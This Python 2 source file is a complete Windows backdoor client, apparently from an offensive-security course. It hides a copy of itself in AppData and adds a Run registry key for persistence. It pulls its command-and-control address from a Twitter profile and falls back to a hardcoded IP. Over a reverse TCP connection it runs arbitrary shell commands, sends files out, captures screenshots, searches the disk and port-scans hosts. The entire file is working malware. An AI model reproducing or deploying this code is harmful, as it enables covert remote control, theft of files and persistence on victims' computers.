# Client

import socket # for building TCP conneciton
import subprocess # to start the shell in the system
import os # needed for file operations, change directory etc
import ctypes # to edit file attributes (make file hidden)
import shutil # needed for file copying
from _winreg import * # needed for editing registry

import time
import random
import string

from PIL import ImageGrab # used to Grab a screenshot
import tempfile # used to create a temp directory (to save screenshot until it got transfered)

from BeautifulSoup import BeautifulSoup as soupy # used to parse twitter html
import urllib # used to get html (twitter website)
import re # parse tweet


FILE_ATTRIBUTE_HIDDEN = 0x02


# function to create a random string
def randomword(length):
    return ''.join(random.choice(string.lowercase) for i in range(length))


# function to verify if our registry key is already there
def keyIsNotInReg():

    try:
        root_key = OpenKey(HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run\\', 0, KEY_READ)
        [Pathname,regtype] = (QueryValueEx(root_key,"RegTCPClientUpdater"))
        CloseKey(root_key)
        if (""==Pathname):
            return True
        else:
            # everything is okay, means key is there can be read
            return False

    except WindowsError,e:
        # could not read, find key ...
        return True
    

# reconn phase

# get current working directory where the backdoor gets executed
# we use the output to build our source path
# could be sth like:
# C:\Windows\System32 or C:\Users\XY\Desktop\XY
path = os.getcwd().strip('/n')

# get user profile which contains the username, store in userprof var
# C:\Windows\System32>set USERPROFILE
# USERPROFILE=C:\Users\Max
Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')

# create random dest filename
random_string = randomword(6)
random_filename = random_string + '.exe'

# build dest path where we copy our backdor - we choose C:\Users\XY\Documents\
# destination = userprof.strip('\n\r') + '\\Documents\\' + random_filename
destination = userprof.strip('\n\r') + '\\AppData\\Local\\' + random_filename


# reconn phase 1 & 2

# verify if our script was run before and our backdoor was started via registry - if yes, no need to keep current backdoor
if keyIsNotInReg():
    
    # verify if our script was run before and our backdoor was copied to our destination
    if not os.path.exists(destination):

        # first time our backdoor gets executed
        # copy our backdoor to our destination - C:\Users\XY\Documents\
        shutil.copyfile(path + '\\persistence_tcp.exe', destination)

        # make file hidden
        if os.name == 'nt':
            # unicode string is needed
            ret = ctypes.windll.kernel32.SetFileAttributesW(unicode(destination, 'utf-8'), FILE_ATTRIBUTE_HIDDEN)

        # create registry key called Regupdater pointing to our  new backdoor path (destination)
        # we use HKEY_CURRENT_USER path, so we do not need admin priv
        key = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
        SetValueEx(key, 'RegTCPClientUpdater', 0, REG_SZ, destination)
        key.Close()


# function to transfer / send a file to our attack machine
def transfer(s, path):
    if os.path.exists(path): # verify if request file exists
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()

    else: # file does not exist
        s.send('Unable to find out the file')


# low level port scanner function
def scanner(s, ip, ports):

    scan_result = '' # var to store scan result

    for port in ports.split(','): # list or ports is separated by a comma
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # to prevent "socket.error: [Errno 98] Address already in use" (socket is in a TIME_WAIT state)
            # we set a flag to prevent this
            # SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state, without waiting for its natural timeout to expire
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
            # try to connect to ip:port
            # connect_ex returns 0 if operation is successfull, means, connection was established -> port is open
            # Like connect(address), but return an error indicator instead of raising an exception for errors
            output = sock.connect_ex((ip, int(port)))

            if output == 0:
                scan_result = scan_result + "[+] Port " + port + " is openend" + '\n'
            else:
                scan_result = scan_result + "[-] Port " + port + " is closed or Host is not reachable" + '\n'                

            sock.close()

        except Exception, e:
            pass

    # all done - send the result back to our attack machine
    s.send(scan_result)
    

def connect(ip, port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # to prevent "socket.error: [Errno 98] Address already in use" (socket is in a TIME_WAIT state)
        # we set a flag to prevent this
        # SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state, without waiting for its natural timeout to expire
        # s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        print 'try to connect'
        s.connect((ip, port))
        print 'after connect'
        while True: # keep receiving data
            command = s.recv(1024)

            if 'terminate' in command:
                s.close() # close the socket
                break

            # grab command - start file transfer
            # grab formula: grab*<file path>
            # grab example: grab*C:\Users\XY\Desktop\Photo.jpg
            elif 'grab' in command:
                grab, path = command.split('*')

                try:
                    transfer(s, path)
                except Exception, e:
                    s.send(str(e)) # send exception error
                    pass

            # we want to change the directory
            elif 'cd ' in command:
                # shell can not handle command like 'cd C:\Users\XY'

                # split command - we want to have the directory
                code, directory = command.split(' ')
                os.chdir(directory)
                s.send( "[+] CWD is " + os.getcwd() )


            # we want to to a 'low level' port scan
            elif 'scan' in command:
                # syntax for that command is "scan 10.10.10.10:21,22,80,123"
                command = command[5:] # cut the scan command
                ip, ports = command.split(':') # split the output into two sections, ip and list of ports
                scanner(s, ip, ports)


            # make screenshot
            elif 'screencap' in command:

                # create a temp dir to store our screenshot file
                # tempfile.mkdtemp() will create temp dir, e.g:
                # c:\users\max\appdata\local\temp\tmp7_nas_
                dirpath = tempfile.mkdtemp() 

                # create screencap and savie in temp dir
                ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")
           
                s.send("[+] saved screenshot to: " + dirpath + "\img.jpg")


            elif 'search' in command:
                # search command is "search C:\\*.pdf"

                # for the search itself we need the directory and the file extension
                command = command[7:] # output would be C:\\*.pdf
                path, ext = command.split('*') # split the command into two sections

                list = ''

                # os.walk walks recursive through file system
                for dirpath, dirname, files in os.walk(path):
                    for file in files:
                        if file.endswith(ext):
                            list = list + '\n' + os.path.join(dirpath, file)

                s.send(list)

            else:
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send( CMD.stdout.read() ) # send the result
                s.send( CMD.stderr.read() ) # incase of error, we will send back the error



def parseTwitterConnectionData():
    html = urllib.urlopen('https://twitter.com/d_schwenk').read()
    soup = soupy(html)

    x = soup.find("meta", {"name":"description"})['content']

    # x will be something like
    # Die neuesten Tweets von Daniel Schwenk (@d_schwenk): "hello from x"

    # use regex to get string (tweet) between '"'
    filter = re.findall(r'"(.*?)"',x)
    data = filter[0]

    # verify tweet / data contains ip and port (e.g. 192.168.100.100:8080)
    if re.search(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{4}', data):
        data = data.split(':')    
        ip = data[0]
        port = int(data[1])
        return(ip, port)
    else:
        # could not get tweet or parse it correctyl, return false values
        return(0, 0)
        

def main():

    # get attacker machine network config
    
    # assume our attacker uses a DDNS service, so we have to lookup the ip first
    # ip = socket.gethostbyname('attacker-machine.ddns.net')
    # ip = '192.168.100.187' # use static ip
    # print "Resolved IP (IP of attacker machine) is: " + ip

    # assume we twittered our connection stats
    ip, port = parseTwitterConnectionData()
    if ip == 0 and port == 0:
        # could not get any data from twitter, use hardcoded network stats
        ip = '192.168.100.187'
        port = 8080
    print "Resolved IP (IP:Port of attacker machine) is: %s:%s" % (ip, port)

    # infinite loop in that we try to connect to our host machine. if we got an exception (connection error),
    # then we sleep for a randowm time, pass the exception and try to establish a new connectoin
    while True:

        try:
            if connect(ip, port) == 1:
                break # end infinite loop and so the script

        except:
            sleep_for = random.randrange(1, 10)
            time.sleep(sleep_for) # sleep for a randowm time between 1-10 sec
            # time.sleep(sleep_for * 60) # sleep for a randowm time between 1-10 minutes
            pass


main()
